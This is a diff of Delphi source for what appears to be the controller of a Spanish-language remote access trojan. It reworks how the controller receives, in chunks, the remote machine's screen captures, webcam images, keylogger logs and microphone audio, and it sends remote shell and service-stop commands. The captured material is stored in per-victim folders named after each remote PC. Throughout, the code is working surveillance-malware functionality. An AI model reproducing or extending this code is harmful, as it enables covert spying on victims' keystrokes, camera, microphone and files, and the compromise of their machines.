+    Servidor.Connection.Writeln('CAPSCREEN|' + IntToStr(TrackBarCalidad.Position)+'|'+inttostr((FormVisorCaptura as TScreenMax).imgCaptura.Height)+'|');
 end;
 
 
@@ -2351,6 +2439,8 @@ end;
 
 procedure TFormControl.BtnCapturarWebcamClick(Sender: TObject);
 begin
+  if not BtnCapturarWebcam.enabled then exit;
+
   if not Servidor.Connection.Connected then
   begin
     MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
@@ -2358,9 +2448,12 @@ begin
   end;
 
   if(ComboBoxWebcam.Items.Count=0) or (ComboBoxWebcam.Items.Text = '') then Exit;
-
+  BtnCapturarWebcam.enabled := false;
   //imgWebcam.Picture := nil; //Refrescamos// Genera un parpadeo
-  PedirPorSegundoSocket(1,'');
+  if TimerCamCapture.enabled then
+      TimerCamCapture.enabled := not TimerCamCapture.enabled;  //Desactivamos el timer, será activado cuando recibamos la captura
+  Servidor.Connection.Writeln('CAPTURAWEBCAM|' + IntToStr(ComboboxWebcam.ItemIndex) +
+    '|' + IntToStr(TrackBarCalidadWebcam.Position));
 end;
 
 procedure TFormControl.EnviarClickM(Sender: TObject; Button: TMouseButton;
@@ -2454,7 +2547,7 @@ begin
     self.TimerCaptureScreen.Enabled := False;
     exit;
   end;
-  PedirPorSegundoSocket(0,'');
+  BtnCapturarScreen.click;
 end;
 
 
@@ -2478,7 +2571,7 @@ begin
   if PageControlArchivos.ActivePage = TabSheetVerArchivos then
     FilePath := Trim(EditPathArchivos.Text) + Trim(mslistviewitem.Caption)
   else
-    FilePath := Trim(mslistviewitem.Caption);
+    FilePath := Trim(mslistviewitem.subitems[0]);
 
   if (mslistviewitem.ImageIndex = 3) then
   begin
@@ -2553,8 +2646,10 @@ var
   tmpstr, tempstr1, tempstr2, tempstr3 : string;
   Item  : Tlistitem;
   p : pointer;
+  Bufferr: array[0..1023] of byte;
 begin
   Buffer := Trim(Athread.Connection.ReadLn);
+
   if Copy(PChar(Buffer), 1, 7) = 'GETFILE' then
   begin
     Delete(Buffer, 1, Pos('|', Buffer));
@@ -2563,8 +2658,7 @@ begin
     Size     := StrToInt(Trim(Buffer));
     CrearDirectoriosUsuario();
     Descarga := TDescargaHandler.Create(Athread, FilePath, Size,
-    ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Descargas\'+
-    ExtractFileName(FilePath), ListViewDescargas, True);
+    DirDescargas+ ExtractFileName(FilePath), ListViewDescargas, True);
     Descarga.callback := Self.TransferFinishedNotification;
     Descarga.transferFile;
   end
@@ -2605,271 +2699,269 @@ begin
       Descarga.UploadFile;
     end;
   end
-  else if Copy(PChar(Buffer), 1, 9) = 'CAPSCREEN' then
+  else if Copy(PChar(Buffer), 1, 14) = 'CAPSCREENSTART' then
   begin
+    {Se dispone a empezar a mandar la captura, tenemos que preparar el memory stream y el tamaño del buffer que tenemos que recibir}
     Delete(Buffer, 1, Pos('|', Buffer));
+    {La anchura y altura de su pantalla}
     FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
     AnchuraPantalla := strtoint(Copy(FilePath, 1, Pos('¬', FilePath) - 1));
     Delete(FilePath, 1, Pos('¬', FilePath));
     AlturaPantalla := strtoint(FilePath);
     Delete(Buffer, 1, Pos('|', Buffer));
-    Size := StrToInt(Trim(Buffer));
-    BtnCapturarScreen.Enabled := False;
-    MS := TMemoryStream.Create;
-    MS.Position := 0;
-    GenericBar := ProgressBarScreen;
-    ObtenerScreenCap_CamCap(AThread, Size, MS);
-    MS.Position := 0;
-    JPG := TJPEGImage.Create;
-    JPG.LoadFromStream(MS);
+    
+    {0=CapScreen}
+    CapSize[0] := StrToInt(Trim(Buffer));
+    MSC[0] := TMemoryStream.Create;
+    MSC[0].Position := 0;
+    ProgressBarScreen.Position := 0; //La ponemos a 0
     if FormVisorCaptura <> nil then
-    begin
-      (FormVisorCaptura as TScreenMax).ImgCaptura.Picture.Assign(JPG)
-    end
-    else
-    begin
-      imgCaptura.Width := JPG.Width; //Establecemos ancho
-      imgCaptura.Height := JPG.Height; //Establecemos alto
-      imgcaptura.Picture.Assign(JPG);
-    end;
-    LabelTamano.Caption := IntToStr(MS.Size div 1024); //Es interesante saber el tamaño
-    if(PrefijoGuardarCaptura <> '') then
-    begin
-      InumeroCaptura := InumeroCaptura+1;
-      CrearDirectoriosUsuario();
-      while FileExists(extractfiledir(ParamStr(0))+'\Usuarios\'+NombrePc+'\Capturas\'+PrefijoGuardarCaptura+IntToStr(InumeroCaptura)+'.jpg') do
-        PrefijoGuardarCaptura := PrefijoGuardarCaptura + '_';
-      MS.SaveToFile(extractfiledir(ParamStr(0))+'\Usuarios\'+NombrePc+'\Capturas\'+PrefijoGuardarCaptura+IntToStr(InumeroCaptura)+'.jpg');
-    end;
-    MS.Free;
-    JPG.Free;
-    BtnCapturarScreen.Enabled := True;
-    RecibiendoJPG := false;
-    TimerCaptureScreen.Enabled  := CheckBoxAutoCapturaScreen.Checked; //Volvemos a activar
+      (FormVisorCaptura as TScreenMax).Progressbar.position := ProgressBarScreen.Position;
   end
-  else if Copy(PChar(Buffer), 1, 13) = 'CAPTURAWEBCAM' then
+  else if Copy(PChar(Buffer), 1, 14) = 'CAPSCREENCHUNK' then
   begin
+  {Estamos recibiendo un fragmento de la captura de pantalla}
     Delete(Buffer, 1, Pos('|', Buffer));
-    //FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
-    //AnchuraWebCam := StrToInt(Copy(FilePath, 1, Pos('¬', FilePath) - 1));
-    //Delete(FilePath, 1, Pos('¬', FilePath));
-    //AlturaWebCam := StrToInt(FilePath);
+    Size := strtoint(Copy(Buffer, 1, Pos('|', Buffer) - 1));
     Delete(Buffer, 1, Pos('|', Buffer));
-		Size := StrToInt(Trim(Buffer));
-		BtnCapturarWebcam.Enabled := False;	
-    MS := TMemoryStream.Create;
-    MS.Position := 0;
-    GenericBar := ProgressBarWebCam;
-    ObtenerScreenCap_CamCap(AThread, Size, MS);
-    MS.Position := 0;
-    JPG := TJPEGImage.Create;
-    JPG.LoadFromStream(MS);
-    imgWebcam.Width := JPG.Width; //Establecemos ancho
-    imgWebcam.Height := JPG.Height; //Establecemos alto
-    imgWebcam.Picture.Assign(JPG);
-    LabelTamaniowebcam.caption := IntToStr(MS.Size div 1024); //Es interesante saber el tamaño
-    if(PrefijoGuardarWebcam <> '') then
-    begin
-      InumeroWebcam := InumeroWebcam+1;
-      CrearDirectoriosUsuario();
-      while FileExists(extractfiledir(ParamStr(0))+'\Usuarios\'+NombrePc+'\Webcam\'+PrefijoGuardarWebcam+IntToStr(InumeroWebcam)+'.jpg') do
-        PrefijoGuardarWebcam := PrefijoGuardarWebcam + '_';
-      MS.SaveToFile(extractfiledir(ParamStr(0))+'\Usuarios\'+NombrePc+'\Webcam\'+PrefijoGuardarWebcam+IntToStr(InumeroWebcam)+'.jpg');
-    end;
-    MS.Free;
-    JPG.Free;
-		BtnCapturarWebcam.Enabled := True;
-    RecibiendoJPG := false;
-    TimerCamCapture.Enabled  := CheckBoxAutoCamCapture.Checked;
-  end
-  else if Copy(PChar(Buffer), 1, 9) = 'THUMBNAIL' then
-  begin
-    Delete(Buffer, 1, Pos('|', Buffer));
-    Size := StrToInt(Trim(Buffer));  //Tamaño del Thumbnail
-    GenericBar := (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).ProgressBarThumbnail;
-    MS := TMemoryStream.Create;
-    MS.Position := 0;
-    ObtenerScreenCap_CamCap(AThread, Size, MS);
-    MS.Position := 0;
-    if(MS.Size <> 1) then //si es =1 es que ha habido un error
-    begin
-      JPG := TJPEGImage.Create;
-      JPG.LoadFromStream(MS);
-      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).imageThumnail.picture.Assign(JPG);
-      JPG.Free;
-    end
-    else
-    begin
-      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).StatusBar.panels[3].text := _('Error al generar el thumbnail');
-    end;
-    MS.Free;
 
-    RecibiendoJPG := false;
+    Athread.Connection.ReadBuffer(bufferr, Size); //Recibimos el bloque
+    MSC[0].Write(Bufferr, Size); //Escribimos el bloque
+
+    //Actualizamos la barra de progreso
+    ProgressBarScreen.Position := Round((MSC[0].size * 100) / CapSize[0]);
+    if FormVisorCaptura <> nil then
+      (FormVisorCaptura as TScreenMax).Progressbar.position := ProgressBarScreen.Position;
+    if (CapSize[0] = MSC[0].Size) then //Hemos terminado :D
+    begin
+      ProgressBarScreen.Position := 0;
+      if FormVisorCaptura <> nil then
+        (FormVisorCaptura as TScreenMax).Progressbar.position := ProgressBarScreen.Position;
+      MSC[0].Position := 0;
+      JPG := TJPEGImage.Create;
+      JPG.LoadFromStream(MSC[0]);
+
+      if FormVisorCaptura <> nil then
+      begin
+        (FormVisorCaptura as TScreenMax).ImgCaptura.width := JPG.Width;
+        (FormVisorCaptura as TScreenMax).ImgCaptura.Picture.Assign(JPG)
+      end
+      else
+      begin
+        imgCaptura.Width := JPG.Width; //Establecemos ancho
+        imgCaptura.Height := JPG.Height; //Establecemos alto
+        imgcaptura.Picture.Assign(JPG);
+      end;
+      
+      LabelTamano.Caption := IntToStr(MSC[0].Size div 1024); //Es interesante saber el tamaño
+      if(PrefijoGuardarCaptura <> '') then
+      begin
+        InumeroCaptura := InumeroCaptura+1;
+        CrearDirectoriosUsuario();
+        while FileExists(DirCapturas+PrefijoGuardarCaptura+IntToStr(InumeroCaptura)+'.jpg') do
+          PrefijoGuardarCaptura := PrefijoGuardarCaptura + '_';
+        MSC[0].SaveToFile(DirCapturas+PrefijoGuardarCaptura+IntToStr(InumeroCaptura)+'.jpg');
+      end;
+      MSC[0].Free;
+      JPG.Free;
+      BtnCapturarScreen.Enabled := True;
+      RecibiendoJPG := false;
+      TimerCaptureScreen.Enabled  := CheckBoxAutoCapturaScreen.Checked; //Volvemos a activar
+    end;
+  end
+  else if Copy(PChar(Buffer), 1, 18) = 'CAPTURAWEBCAMSTART' then
+  begin
+    Delete(Buffer, 1, Pos('|', Buffer));
+		CapSize[1] := StrToInt(Trim(Buffer));
+    MSC[1] := TMemoryStream.Create;
+    MSC[1].Position := 0;
+    ProgressBarWebCam.position := 0;
+  end
+  else if Copy(PChar(Buffer), 1, 11) = 'WEBCAMCHUNK' then
+  begin
+    Delete(Buffer, 1, Pos('|', Buffer));
+    Size := strtoint(Copy(Buffer, 1, Pos('|', Buffer) - 1));     //Tamaño del chunk!
+    Delete(Buffer, 1, Pos('|', Buffer));
+
+    Athread.Connection.ReadBuffer(bufferr, Size); //Recibimos el bloque
+    MSC[1].Write(Bufferr, Size); //Escribimos el bloque
+
+    //Actualizamos la barra de progreso
+    ProgressBarWebCam.Position := Round((MSC[1].size * 100) / CapSize[1]);
+    
+    if MSC[1].size = Capsize[1] then
+    begin
+      MSC[1].Position := 0;
+      ProgressBarWebCam.position := 0;
+      JPG := TJPEGImage.Create;
+      JPG.LoadFromStream(MSC[1]);
+      imgWebcam.Width := JPG.Width; //Establecemos ancho
+      imgWebcam.Height := JPG.Height; //Establecemos alto
+      imgWebcam.Picture.Assign(JPG);
+      LabelTamaniowebcam.caption := IntToStr(MSC[1].Size div 1024); //Es interesante saber el tamaño
+      if(PrefijoGuardarWebcam <> '') then
+      begin
+        InumeroWebcam := InumeroWebcam+1;
+        CrearDirectoriosUsuario();
+        while FileExists(DirWebcam+PrefijoGuardarWebcam+IntToStr(InumeroWebcam)+'.jpg') do
+          PrefijoGuardarWebcam := PrefijoGuardarWebcam + '_';
+        MSC[1].SaveToFile(DirWebcam+PrefijoGuardarWebcam+IntToStr(InumeroWebcam)+'.jpg');
+      end;
+      MSC[1].Free;
+      JPG.Free;
+		  BtnCapturarWebcam.Enabled := True;
+      TimerCamCapture.Enabled  := CheckBoxAutoCamCapture.Checked;
+    end;
+  end
+  else if Copy(PChar(Buffer), 1, 14) = 'THUMBNAILSTART' then
+  begin
+    Delete(Buffer, 1, Pos('|', Buffer));
+    CapSize[2] := StrToInt(Trim(Buffer));  //Tamaño del Thumbnail
+    
+    (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).ProgressBarThumbnail.position := 0;
+    MSC[2] := TMemoryStream.Create;
+    MSC[2].Position := 0;
+
+  end
+  else if Copy(PChar(Buffer), 1, 14) = 'THUMBNAILERROR' then
+  begin
+    (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).ProgressBarThumbnail.position := 0;
+    MSC[2].Free;
+    (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).statusbar.panels[3].text := 'ERROR';
     (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).callback();
   end
-  else if Copy(PChar(Buffer), 1, 12) = 'KEYLOGGERLOG' then
+  else if Copy(PChar(Buffer), 1, 14) = 'THUMBNAILCHUNK' then
   begin
     Delete(Buffer, 1, Pos('|', Buffer));
-    Size := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1));  //Tamaño del Log
-    GenericBar := ProgressBarKeylogger;
-    //StatusBar.Panels[1].Text := inttostr(size)+'B'; //Es interesante saber el tamaño
-    ObteneryAniadirKeyloggerLog(AThread, Size); //lo obtenemos y añadimos al richedit
-    SpeedButtonRecibirLog.Enabled := true;
-    RecibiendoJPG := false;
+    Size := strtoint(Copy(Buffer, 1, Pos('|', Buffer) - 1));     //Tamaño del chunk!
+    Delete(Buffer, 1, Pos('|', Buffer));
+    
+    Athread.Connection.ReadBuffer(bufferr, Size); //Recibimos el bloque
+    MSC[2].Write(Bufferr, Size); //Escribimos el bloque
+
+    //Actualizamos la barra de progreso
+    (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).ProgressBarThumbnail.position := Round((MSC[2].size * 100) / CapSize[2]);
+
+    if (CapSize[2] = MSC[2].Size) then //Hemos terminado :D
+    begin
+      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).ProgressBarThumbnail.position := 0;
+      MSC[2].position := 0;
+      JPG := TJPEGImage.Create;
+      JPG.LoadFromStream(MSC[2]);
+      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).imageThumnail.picture.Assign(JPG);
+      JPG.Free;
+      MSC[2].Free;
+      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).callback();
+    end;
   end
-  else if Copy(PChar(Buffer), 1, 8) = 'GETAUDIO' then
+  else if Copy(PChar(Buffer), 1, 17) = 'KEYLOGGERLOGSTART' then
   begin
     Delete(Buffer, 1, Pos('|', Buffer));
-    Size := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1));  //Tamaño del Log
-    GenericBar := self.ProgressBarAudio;
-    MS := TMemoryStream.Create;
-    MS.Position := 0;
-    ObtenerScreenCap_CamCap(AThread, Size, MS);
-    MS.Position := 0;
-    if (MS.Size>10) then 
+    CapSize[4] := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1));  //Tamaño del Log
+    ProgressBarKeylogger.position := 0;
+    MSC[4] := TMemoryStream.Create;
+    MSC[4].Position := 0;
+  end
+  else if Copy(PChar(Buffer), 1, 17) = 'KEYLOGGERLOGCHUNK' then
+  begin
+    Delete(Buffer, 1, Pos('|', Buffer));
+    Size := strtoint(Copy(Buffer, 1, Pos('|', Buffer) - 1));     //Tamaño del chunk!
+    Delete(Buffer, 1, Pos('|', Buffer));
+
+    Athread.Connection.ReadBuffer(bufferr, Size); //Recibimos el bloque
+    MSC[4].Write(Bufferr, Size); //Escribimos el bloque
+
+    ProgressBarKeylogger.position := Round((MSC[4].size * 100) / CapSize[4]);
+
+    if MSC[4].size = Capsize[4] then //Finish!
     begin
-      item := listviewAudio.items.add();
-      NumeroAudio := NumeroAudio +1 ;
-      item.caption := inttostr(NumeroAudio);
-      item.subitems.add(inttostr(ms.size));
-
-      
-      {hz canal bits}
-
-      
-      TmpStr := UltimoFormato;
-      TempStr1 := Copy(TmpStr, 1, pos('-', TmpStr) - 1);     //HZ
-      Delete(TmpStr, 1, pos('-', TmpStr));
-      TempStr2 := Copy(TmpStr, 1, pos('-', TmpStr) - 1);     //Canal
-      Delete(TmpStr, 1, pos('-', TmpStr));
-      TempStr3 := TmpStr;                                    //Bits
-      item.subitems.add(inttostr(strtoint(tempstr1) * strtoint(Tempstr2)*strtoint(Tempstr3) div 8));
-      item.subitems.add(formatdatetime('hh:mm:ss',now));
-
-      Item.Subitems.Add(UltimoFormato);
-      //Creamos el archivo .wav
-      MS2 := TmemoryStream.create;
-      MS2.position := 0;
-      MS.position := 0;
-      setlength(buffer, ms.size);
-      ms.Read(buffer[1], ms.size);
-      InitWavFile(MS2, strtoint(TempStr2), strtoint(TempStr1), strtoint(TempStr3), buffer);
-      setlength(buffer, ms2.size);
-      ms2.Read(buffer[1], ms2.size);
-
-      Getmem(p,MS2.size);
-      MoveMemory(p, MS2.memory, MS2.size);
-      item.data := p; //Guardamos un puntero al sonido
-      item.subitems.add(inttostr(MS2.Size));  //Necesitaremos el tamaño de el puntero ;)
-      
-      if CheckBoxAutoReproducir.checked then
-        sndPlaySound(item.data, SND_MEMORY or SND_ASYNC); //Reproducimos si así se nos ordena
-
-    end
-
-    else
-    begin
-      Statusbar.panels[1].text := _('Error al capturar audio');//Error al capturar audio
+      ProgressBarKeylogger.position := 0;
+      MSC[4].Position := 0;
+      CreardirectoriosUsuario();
+      while fileexists(DirUsuario+'Klog'+inttostr(i)+'.txt') do i := i+1;
+      MSC[4].savetofile(DirUsuario+'Klog'+inttostr(i)+'.txt');
+      MSC[4].Position := 0;
+      RichEditKeylogger.lines.loadfromStream(MSC[4]);
+      MSC[4].free;
+      MSC[4] := nil;
+      SpeedButtonRecibirLog.Enabled := true;
     end;
-    MS.Free;
-    MS2.free;
-    RecibiendoJPG := false;
-  end;
-  
-  //Tenemos preferencia ;-)
-  if CheckBoxCapturarAudioAutomaticamente.checked then
-    SpeedButtonCapAudioClick(nil);
-end;
+  end
+  else if Copy(PChar(Buffer), 1, 10) = 'AUDIOSTART' then
+  begin
+    Delete(Buffer, 1, Pos('|', Buffer));
+    CapSize[3] := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1));  //Tamaño del Log
+    ProgressBarAudio.position := 0;
+    MSC[3] := TMemoryStream.Create;
+    MSC[3].Position := 0;
 
-procedure TFormControl.ObteneryAniadirKeyloggerLog(AThread: TIdPeerThread; filesize: int64);
-var
-  RecibidoTotal  : integer;
-  buffSize       : integer;
-  LineaNueva     : ansistring;
-  UltimaLinea    : boolean;
-  i              : integer;
-begin
-  if(filesize = 0) then exit;
-  RichEditKeylogger.clear;
-  pctProgressBarScreen := 0;
-  Athread.Synchronize(UpdateProgressBarScreen);
-  RecibidoTotal := 0;
-  try
-    while (RecibidoTotal < filesize) and (Athread.Connection.Connected) do
+  end
+  else if Copy(PChar(Buffer), 1, 10) = 'AUDIOCHUNK' then
+  begin
+    Delete(Buffer, 1, Pos('|', Buffer));
+    Size := strtoint(Copy(Buffer, 1, Pos('|', Buffer) - 1));     //Tamaño del chunk!
+    Delete(Buffer, 1, Pos('|', Buffer));
+    
+    Athread.Connection.ReadBuffer(bufferr, Size); //Recibimos el bloque
+    MSC[3].Write(Bufferr, Size); //Escribimos el bloque
+    ProgressBarAudio.position := Round((MSC[3].size * 100) / CapSize[3]);
+
+    if CapSize[3] = MSC[3].size then  //Recibido!
     begin
-      LineaNueva := Athread.Connection.ReadLn;
-      RecibidoTotal := RecibidoTotal + Length(LineaNueva)+2;
-      if (Copy(LineaNueva, 1, 2) = '-[') then //evento
+      MSC[3].position := 0;
+      ProgressBarAudio.position := 0;
+      if (MSC[3].Size>10) then //No ha habido error :D
       begin
-         RichEditKeylogger.SelAttributes.Style := [fsBold];
-         RichEditKeylogger.SelAttributes.Color := clRed;
+        item := listviewAudio.items.add();
+        NumeroAudio := NumeroAudio +1 ;
+        item.caption := inttostr(NumeroAudio);
+        item.subitems.add(inttostr(MSC[3].size));
+        {hz canal bits}
+        TmpStr := UltimoFormato;
+        TempStr1 := Copy(TmpStr, 1, pos('-', TmpStr) - 1);     //HZ
+        Delete(TmpStr, 1, pos('-', TmpStr));
+        TempStr2 := Copy(TmpStr, 1, pos('-', TmpStr) - 1);     //Canal
+        Delete(TmpStr, 1, pos('-', TmpStr));
+        TempStr3 := TmpStr;                                    //Bits
+        item.subitems.add(inttostr(strtoint(tempstr1) * strtoint(Tempstr2)*strtoint(Tempstr3) div 8));
+        item.subitems.add(formatdatetime('hh:mm:ss',now));
+
+        Item.Subitems.Add(UltimoFormato);
+        //Creamos el archivo .wav
+        MS2 := TmemoryStream.create;
+        MS2.position := 0;
+        MSC[3].position := 0;
+        setlength(buffer, MSC[3].size);
+        MSC[3].Read(buffer[1], MSC[3].size);
+        InitWavFile(MS2, strtoint(TempStr2), strtoint(TempStr1), strtoint(TempStr3), buffer);
+        setlength(buffer, ms2.size);
+        ms2.Read(buffer[1], ms2.size);
+
+        Getmem(p,MS2.size);
+        MoveMemory(p, MS2.memory, MS2.size);
+        item.data := p; //Guardamos un puntero al sonido
+        item.subitems.add(inttostr(MS2.Size));  //Necesitaremos el tamaño de el puntero ;)
+
+        if CheckBoxAutoReproducir.checked then
+          sndPlaySound(item.data, SND_MEMORY or SND_ASYNC); //Reproducimos si así se nos ordena
       end
-      else if (Copy(LineaNueva, 1, 2) = '-{') then
-      begin
-         RichEditKeylogger.SelAttributes.Style := [fsBold];
-         RichEditKeylogger.SelAttributes.Color := clgreen;
-      end
+
       else
       begin
-         RichEditKeylogger.SelAttributes.Style := [];
-         RichEditKeylogger.SelAttributes.Color := clblack;
+        Estado(_('Error al capturar audio'));//Error al capturar audio
       end;
-      if not (RecibidoTotal < Filesize) then ultimalinea := true;
-
-      if((not ultimalinea)) then
-        RichEditKeylogger.SelText :=LineaNueva+#13+#10
-      else
-      if((ultimalinea)) then
-        RichEditKeylogger.SelText :=LineaNueva;
-      pctProgressBarScreen := Round((RecibidoTotal * 100) / FileSize);
-      Athread.Synchronize(UpdateProgressBarScreen);
+      
+      MSC[3].Free;
+      MSC[3] := nil;
+      MS2.free;
+      SpeedButtonCapAudio.enabled := true;
+      if CheckBoxCapturarAudioAutomaticamente.checked then
+        SpeedButtonCapAudioClick(nil);
     end;
-  finally
-    CreardirectoriosUsuario();
+  end;
 
-
-    while fileexists(extractfilepath(Paramstr(0))+'Usuarios\'+NombrePC+'\Klog'+inttostr(i)+'.txt') do
-      i := i+1;
-
-    RichEditKeylogger.plaintext := true;  //Se guarda como archivo de texto plano
-    RichEditKeylogger.lines.savetofile(extractfilepath(Paramstr(0))+'Usuarios\'+NombrePC+'\Klog'+inttostr(i)+'.txt');
-  end;//end de finally
 end;
-
-
-function TFormControl.ObtenerScreenCap_CamCap(AThread: TIdPeerThread; filesize: int64;var MS: TmemoryStream):string;
-var
-  Buffer: array[0..1023] of byte;
-  Read, currRead: integer;
-  buffSize: integer;
-begin
-  Read     := 0;
-  currRead := 0;
-  pctProgressBarScreen := 0;
-  Athread.Synchronize(UpdateProgressBarScreen);
-  buffSize := SizeOf(Buffer);
-  try
-    while (Read < FileSize) and (Athread.Connection.Connected) do
-    begin
-      if (FileSize - Read) >= buffSize then
-        currRead := buffSize
-      else
-        currRead := (FileSize - Read);
-
-      Athread.Connection.ReadBuffer(buffer, currRead);
-      Read := Read + currRead;
-      //BlockWrite(F, Buffer, currRead);
-
-      MS.Write(Buffer, currRead);
-      pctProgressBarScreen := Round((Read * 100) / FileSize);
-      Athread.Synchronize(UpdateProgressBarScreen);
-    end;
-  finally
-   // CloseFile(F);
-    {Athread.Data := nil;
-    Athread.Connection.Disconnect;    }
-  end;//end de finally
-end;
+    
  //se llama cada vez que finaliza una descarga para que se inicie
  //alguna otra descarga que haya sido puesta en cola
 procedure TFormControl.TransferFinishedNotification(Sender: TObject;filename:string);
@@ -2880,13 +2972,13 @@ begin
 
   if(AnsiLowerCase(extractfilename(filename)) = 'thumbs.db') then
   begin
-    CargarThumbsFileAlListview(extractfilepath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Descargas\thumbs.db');//cargamos las miniaturas
+    CargarThumbsFileAlListview(DirDescargas+'thumbs.db');//cargamos las miniaturas
     Receivingthumbfile := false;
   end
   else
   begin
 
-    Statusbar.panels[1].text := _('Transferencia finalizada: ')+extractfilename(filename);
+    Estado(_('Transferencia finalizada: ')+extractfilename(filename));
   end;
   if not Servidor.Terminated and Servidor.Connection.Connected then
   begin
@@ -2903,15 +2995,6 @@ begin
     end;
   end;
 end;
-
-
-procedure TFormControl.UpdateProgressBarScreen;
-begin
-  GenericBar.Position := pctProgressBarScreen;
-  if(GenericBar.position = 100) then
-    GenericBar.position := 0;//La reiniciamos
-end;
-
 
 procedure TFormControl.ListViewDescargasContextPopup(Sender: TObject;
   MousePos: TPoint; var Handled: boolean);
@@ -3135,8 +3218,7 @@ begin
   begin
     if Lowercase(ComboBoxShellCommand.Text) = 'cls' then
       MemoShell.Text := '';
-    MemoShell.Text := Trim(MemoShell.Text);
-    
+
     Servidor.Connection.Writeln('SHELL|' + ComboBoxShellCommand.Text);
 
     //Agrega el comando que acabo de escribir a la lista de comandos del combobox
@@ -3203,7 +3285,7 @@ begin
   if DlgGuardar.Execute then
   begin
     MemoShell.Lines.SaveToFile(DlgGuardar.FileName);
-    StatusBar.Panels[1].Text := _('Archivo guardado como: ') + DlgGuardar.FileName;
+    Estado(_('Archivo guardado como: ') + DlgGuardar.FileName);
   end;
 end;
 
@@ -3228,7 +3310,12 @@ begin
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     exit;
   end;
-  Servidor.Connection.Writeln('DETENERSERVICIO' + ListViewServicios.Selected.Caption);
+   mslistviewitem := ListViewServicios.Selected;
+   while Assigned(mslistviewitem) do
+   begin
+      Servidor.Connection.Writeln('DETENERSERVICIO' + mslistviewitem.Caption);
+      mslistviewitem := ListViewServicios.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+   end;
 end;
 
 procedure TFormControl.Iniciar1Click(Sender: TObject);
@@ -3400,11 +3487,10 @@ begin
       if PageControlArchivos.ActivePage = TabSheetVerArchivos then
         FilePath := EditPathArchivos.Text + mslistviewitem.Caption
       else
-        FilePath := mslistviewitem.Caption;
+        FilePath := mslistviewitem.subitems[0];
       Size     := StrToInt(mslistviewitem.SubItems.Strings[4]);
       Descarga := TDescargaHandler.Create(nil, FilePath, Size,
-      ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Descargas\' +
-      ExtractFileName(FilePath), ListViewDescargas, True);
+      DirDescargas+ExtractFileName(FilePath), ListViewDescargas, True);
       Descarga.callback := Self.TransferFinishedNotification;
       if PageControlArchivos.ActivePage = TabSheetVerArchivos then
         mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
@@ -3599,7 +3685,7 @@ begin
     if PageControlArchivos.ActivePage = TabSheetVerArchivos then
       FilePath := (EditPathArchivos.Text + mslistviewitem.Caption)
     else
-      FilePath := mslistviewitem.Caption;
+      FilePath := mslistviewitem.subitems[0];
 
     (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).aniadirthumbnail(Filepath);
     
@@ -3644,7 +3730,7 @@ begin
     self.TimerCamCapture.Enabled := False;
     exit;
   end;
-  PedirPorSegundoSocket(1,'');
+  BtnCapturarWebcam.click;
   
 end;
 
@@ -3684,68 +3770,33 @@ begin
     end;
       CrearDirectoriosUsuario();
       Descarga := TDescargaHandler.Create(nil, FileName, Tamano,
-      ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Descargas\' +
-      ExtractFileName(FileName), ListViewDescargas, True);
+      DirDescargas +ExtractFileName(FileName), ListViewDescargas, True);
       Descarga.callback := TransferFinishedNotification;
 
 end;
 
 procedure TFormControl.CrearDirectoriosUsuario();
-begin
-if( not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Usuarios\')) then
-CreateDir(ExtractFilePath(ParamStr(0)) + 'Usuarios\');
-
-if( not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\')) then
-CreateDir(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\');
-
-if( not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Capturas\')) then
-CreateDir(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Capturas\');
-
-if( not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Webcam\')) then
-CreateDir(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Webcam\');
-
-if( not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Thumbnails\')) then
-CreateDir(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Thumbnails\');
-
-if( not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Descargas\')) then
-CreateDir(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Descargas\');
-end;
-
-procedure TFormControl.PedirPorSegundoSocket(tipo:integer;info:string);//0=pantalla 1=webcam 2=thumnails info=thumbnailpath
-begin          //la funcion que pide las capturas de webcam, de pantalla y los thumbnails
-  if (RecibiendoJPG) then exit;   //Se piden por aqui para en el futuro crear un sistema por turnos 
-  RecibiendoJPG := true;
-
-  if(tipo = 0) then      //CAPSCREEN
+  procedure Creadir(dir:string);
+  var
+    tmp:string;
   begin
-    if TimerCaptureScreen.enabled then
-      TimerCaptureScreen.enabled := not TimerCaptureScreen.enabled;  //Desactivamos el timer, será activado cuando recibamos la captura
-    if FormVisorCaptura = nil then
-      Servidor.Connection.Writeln('CAPSCREEN|' + IntToStr(TrackBarCalidad.Position)+'|'+inttostr(imgCaptura.Height)+'|')
-    else
